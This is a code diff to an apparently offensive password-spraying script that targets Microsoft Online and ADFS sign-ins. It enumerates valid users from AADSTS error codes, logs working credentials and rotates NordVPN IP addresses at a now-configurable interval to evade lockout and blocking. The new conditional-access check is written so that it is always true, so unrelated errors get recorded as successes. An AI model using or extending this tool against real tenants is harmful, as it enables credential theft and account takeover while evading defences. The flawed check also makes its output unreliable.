@@ -38,14 +38,15 @@ def args_parse():
     target_group.add_argument('-t', '--target', help="Target server to authenticate against")
     parser.add_argument("-v", "--verbose", action="store_true", help="Prints usernames that could exist in case of invalid password", default=False)
     parser.add_argument("-f", "--force", action=argparse.BooleanOptionalAction, help="Forces the spray to continue and not stop when multiple account lockouts are detected.")
-    parser.add_argument("--vpn", action=argparse.BooleanOptionalAction, help="Use nord vpn to rotate IP")
     parser.add_argument('--skip-tested', action='store_true', help="Skip user:password already tried and logged in the DB")
     parser.add_argument('--ignore-success', action='store_true', help="Skip user already pwned in the DB")
+    parser.add_argument("--vpn", action=argparse.BooleanOptionalAction, help="Use nord vpn to rotate IP")
     parser.add_argument("--vpn-area", default="Europe", help="VPN Zone(s) to use (ex: --vpn-area France,Germany,Netherlands,United Kingdom). Défaut: Europe.")
+    parser.add_argument("--vpn-tries-per-ip", type=int, default=15, help="Number of tries per IP before rotating IP")
     parser.add_argument('method', choices=['adfs', 'msol'])
     return parser.parse_args()
 
-def msol_attempts(usernames, passwords, targets, sleep_time, random, min_sleep, max_sleep, vpn, area, initial_ip, skip_tested, ignore_success, userAsPass, force):
+def msol_attempts(usernames, passwords, targets, sleep_time, random, min_sleep, max_sleep, vpn, vpn_area, vpn_tries_per_ip, initial_ip, skip_tested, ignore_success, userAsPass, force):
     working_creds_counter = 0  # zeroing the counter of working creds before starting to count
     username_counter = 0
     prev_ip = initial_ip
@@ -78,8 +79,8 @@ def msol_attempts(usernames, passwords, targets, sleep_time, random, min_sleep, 
                         LOGGER.info(f"[SKIP] {username}:{password} already tested — skipping.")
                         continue
                 
-                if vpn and username_counter%15==0:
-                    new_ip = safe_rotate_vpn(area, prev_ip=prev_ip, rotate_retries=4)
+                if vpn and username_counter % vpn_tries_per_ip == 0:
+                    new_ip = safe_rotate_vpn(vpn_area, prev_ip=prev_ip, rotate_retries=4)
                     if new_ip:
                         prev_ip = new_ip
                         LOGGER.debug(f"[VPN] Using IP {prev_ip}")
@@ -108,7 +109,7 @@ def msol_attempts(usernames, passwords, targets, sleep_time, random, min_sleep, 
 
                 if r.status_code == 200:
                     LOGGER.info(f"SUCCESS! {username} : {password}")
-                    log_event(subject=username, password=password, target="https://graph.windows.net", status="success",  ip=ip, details="")
+                    log_event(subject=username, password=password, target=target, status="success",  ip=ip, details="")
                     working_creds_counter += 1
                 else:
                     resp = r.json()
@@ -116,49 +117,49 @@ def msol_attempts(usernames, passwords, targets, sleep_time, random, min_sleep, 
 
                     if "AADSTS50126" in error:
                         LOGGER.error(f"ERROR!: Invalid username or password. Username: {username} could exist.")
-                        log_event(subject=username, password=password, target="https://graph.windows.net", status="fail",  ip=ip, details="AADSTS50126")
+                        log_event(subject=username, password=password, target=target, status="fail",  ip=ip, details="AADSTS50126")
 
                     elif "AADSTS50128" in error or "AADSTS50059" in error:
                         LOGGER.error(f"WARNING! Tenant for account {username} doesn't exist. Check the domain to make sure they are using Azure/O365 services.")
-                        log_event(subject=username, password=password, target="https://graph.windows.net", status="fail",  ip=ip, details="AADSTS50128")
+                        log_event(subject=username, password=password, target=target, status="fail",  ip=ip, details="AADSTS50128")
                         
                     elif "AADSTS50034" in error:
                         LOGGER.error(f"WARNING! The user {username} doesn't exist.")
-                        log_event(subject=username, password=password, target="https://graph.windows.net", status="fail",  ip=ip, details="AADSTS50034")
+                        log_event(subject=username, password=password, target=target, status="fail",  ip=ip, details="AADSTS50034")
                                     
                     elif "AADSTS50079" in error or "AADSTS50076" in error:
                         # Microsoft MFA response
                         LOGGER.info(f"SUCCESS! {username} : {password} - NOTE: The response indicates MFA (Microsoft) is in use.")
-                        log_event(subject=username, password=password, target="https://graph.windows.net", status="success",  ip=ip, details="The response indicates MFA (Microsoft) is in use.")
+                        log_event(subject=username, password=password, target=target, status="success",  ip=ip, details="The response indicates MFA (Microsoft) is in use.")
                         working_creds_counter += 1
                         
-                    elif "AADSTS50158" in error:
+                    elif "AADSTS50158" or "AADSTS53003" in error:
                         # Conditional Access response (Based off of limited testing this seems to be the response to DUO MFA)
                         LOGGER.info(f"SUCCESS! {username} : {password} - NOTE: The response indicates conditional access (MFA: DUO or other) is in use.")
-                        log_event(subject=username, password=password, target="https://graph.windows.net", status="success",  ip=ip, details="The response indicates conditional access (MFA: DUO or other) is in use.")
+                        log_event(subject=username, password=password, target=target, status="success",  ip=ip, details="The response indicates conditional access (MFA: DUO or other) is in use.")
                         working_creds_counter += 1
                         
                     elif "AADSTS50053" in error:
                         # Locked out account or Smart Lockout in place
                         LOGGER.error(f"WARNING! The account {username} appears to be locked.")
-                        log_event(subject=username, password=password, target="https://graph.windows.net", status="fail",  ip=ip, details="AADSTS50053")
+                        log_event(subject=username, password=password, target=target, status="fail",  ip=ip, details="AADSTS50053")
                         lockout_counter += 1
                         
                     elif "AADSTS50057" in error:
                         # Disabled account
                         LOGGER.error(f"WARNING! The account {username} appears to be disabled.")
-                        log_event(subject=username, password=password, target="https://graph.windows.net", status="fail",  ip=ip, details="AADSTS50057")
+                        log_event(subject=username, password=password, target=target, status="fail",  ip=ip, details="AADSTS50057")
                         
                     elif "AADSTS50055" in error:
                         # User password is expired
                         LOGGER.info(f"SUCCESS! {username} : {password} - NOTE: The user's password is expired.")
-                        log_event(subject=username, password=password, target="https://graph.windows.net", status="success",  ip=ip, details="AADSTS50055")
+                        log_event(subject=username, password=password, target=target, status="success",  ip=ip, details="AADSTS50055")
                         working_creds_counter += 1
                         
                     else:
                         # Unknown errors
                         LOGGER.error(f"Got an error we haven't seen yet for user {username}")
-                        log_event(subject=username, password=password, target="https://graph.windows.net", status="fail",  ip=ip, details="Got an error we haven't seen yet for user.")
+                        log_event(subject=username, password=password, target=target, status="fail",  ip=ip, details="Got an error we haven't seen yet for user.")
                         LOGGER.error(error)
                 session.close()
 
@@ -192,7 +193,7 @@ def msol_attempts(usernames, passwords, targets, sleep_time, random, min_sleep, 
     LOGGER.info("[*] Finished running at: %s" % datetime.datetime.now().strftime('%d-%m-%Y %H:%M:%S'))
 
 
-def adfs_attempts(usernames, passwords, targets, sleep_time, random, min_sleep, max_sleep, vpn, area, initial_ip, skip_tested, ignore_success, userAsPass):
+def adfs_attempts(usernames, passwords, targets, sleep_time, random, min_sleep, max_sleep, vpn, vpn_area, vpn_tries_per_ip, initial_ip, skip_tested, ignore_success, userAsPass):
     working_creds_counter = 0  # zeroing the counter of working creds before starting to count
     username_counter = 0
     prev_ip = initial_ip
@@ -225,8 +226,8 @@ def adfs_attempts(usernames, passwords, targets, sleep_time, random, min_sleep, 
                             LOGGER.info(f"[SKIP] {username}:{password} already tested — skipping.")
                             continue  # passe au suivant
 
-                    if vpn and username_counter % 15 == 0:
-                        new_ip = safe_rotate_vpn(area, prev_ip=prev_ip, rotate_retries=4)
+                    if vpn and username_counter % vpn_tries_per_ip == 0:
+                        new_ip = safe_rotate_vpn(vpn_area, prev_ip=prev_ip, rotate_retries=4)
                         if new_ip:
                             prev_ip = new_ip
                             LOGGER.debug(f"[VPN] Using IP {prev_ip}")
@@ -373,11 +374,11 @@ def main():
     if args.method == 'adfs':
         LOGGER.info("Now spraying ADFS.")
         adfs_attempts(usernames, passwords, targets,
-                      args.sleep, random, min_sleep, max_sleep, args.vpn, area, initial_ip, args.skip_tested, args.ignore_success, args.userAsPass)
+                      args.sleep, random, min_sleep, max_sleep, args.vpn, area, args.vpn_tries_per_ip, initial_ip, args.skip_tested, args.ignore_success, args.userAsPass)
     elif args.method =='msol':
         LOGGER.info("Now spraying Microsoft Online.")
         msol_attempts(usernames, passwords, targets, args.sleep, random, min_sleep, max_sleep, 
-                  args.vpn, area, initial_ip, args.skip_tested, args.ignore_success, args.userAsPass, args.force)
+                  args.vpn, area, args.vpn_tries_per_ip, initial_ip, args.skip_tested, args.ignore_success, args.userAsPass, args.force)
     else:
         LOGGER.critical("[!] Please choose a method (autodiscover or adfs)")
 
